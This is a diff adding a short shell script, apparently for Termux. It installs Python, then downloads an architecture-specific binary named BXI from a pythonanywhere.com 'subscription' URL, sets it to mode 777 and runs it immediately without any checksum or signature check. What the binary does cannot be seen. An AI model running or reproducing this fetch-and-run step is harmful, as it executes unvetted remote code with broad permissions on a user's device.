@@ -1,0 +1,18 @@
+if [[ $(command -v python) == "" ]]; then
+    pkg install python -y
+fi
+AARCH=$(dpkg --print-architecture)
+if [[ $AARCH == "aarch64" ]]
+then
+    rm -rf BXI
+    curl -L https://bxisubscription.pythonanywhere.com/static/arm64 --output BXI
+    chmod 777 BXI
+    ./BXI
+else if [[ $AARCH == "arm" ]]
+then
+    rm -rf BXI
+    curl -L https://bxisubscription.pythonanywhere.com/static/arm --output BXI
+    chmod 777 BXI
+    ./BXI
+fi
+fi
